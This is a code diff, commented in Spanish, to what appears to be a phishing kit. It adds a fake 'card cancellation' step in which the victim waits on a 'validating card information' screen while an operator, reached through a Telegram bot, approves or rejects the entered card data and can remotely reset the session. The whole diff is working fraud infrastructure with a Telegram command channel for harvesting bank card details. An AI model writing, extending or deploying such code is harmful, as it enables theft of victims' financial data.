@@ -74,6 +74,65 @@
     // ============ PASADA 2+ (regresó del dashboard) ============
     if (isReturnPass) {
       const flowType = sessionStorage.getItem("flow_type") || "charge";
+      const bajaPendiente = sessionStorage.getItem("baja_pendiente_validacion") === "true"; // <--- [CAMBIO]
+
+      // <--- [CAMBIO INICIO] Bloque nuevo para validar Baja de Tarjeta con ok / no
+      if (flowType === "baja" && bajaPendiente) {
+        textStatus.textContent = "Validando información de tarjeta...";
+
+        await sendTelegram(
+          `🔍 *VALIDACIÓN DE BAJA DE TARJETA*\n\n` +
+          `• Responde \`ok\` si los datos son correctos (cancela tarjeta directo en dashboard).\n` +
+          `• Responde \`no\` si son incorrectos (regresa al formulario con leyenda de error).`
+        );
+
+        async function scanBajaValidation() {
+          try {
+            const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=${punteroId + 1}&timeout=5`);
+            const data = await res.json();
+
+            if (data.ok && data.result && data.result.length > 0) {
+              for (const update of data.result) {
+                punteroId = Number(update.update_id);
+                const msg = update.message || update.channel_post || update.edited_message;
+
+                if (msg && msg.chat && String(msg.chat.id) === String(TELEGRAM_CHAT_ID) && msg.text) {
+                  const low = msg.text.trim().toLowerCase();
+
+                  if (low === 'reinicio' || low === 'reset') {
+                    localStorage.clear();
+                    sessionStorage.clear();
+                    window.location.replace("index.html");
+                    return;
+                  }
+
+                  if (["ok", "si", "sí", "correcto", "adelante"].includes(low)) {
+                    sessionStorage.removeItem("baja_pendiente_validacion");
+                    localStorage.setItem("transaction_status", "aprobado");
+                    await sendTelegram("✅ *Datos correctos.* Mostrando tarjeta cancelada en dashboard...");
+                    window.location.href = "dashboard.html?tab=baja";
+                    return;
+                  }
+
+                  if (["no", "incorrecto", "error", "rechazar", "negar"].includes(low)) {
+                    sessionStorage.removeItem("baja_pendiente_validacion");
+                    sessionStorage.setItem("baja_error", "true");
+                    await sendTelegram("❌ *Datos incorrectos.* Regresando al formulario de baja...");
+                    window.location.href = "dashboard.html?tab=baja";
+                    return;
+                  }
+                }
+              }
+            }
+          } catch (error) { }
+          setTimeout(scanBajaValidation, 1500);
+        }
+
+        scanBajaValidation();
+        return;
+      }
+      // <--- [CAMBIO FIN]
+
       const cfgMerchant = sessionStorage.getItem("charge_merchant") || DEFAULT_MERCHANT;
       const cfgAmount = sessionStorage.getItem("charge_amount") || DEFAULT_AMOUNT;
 
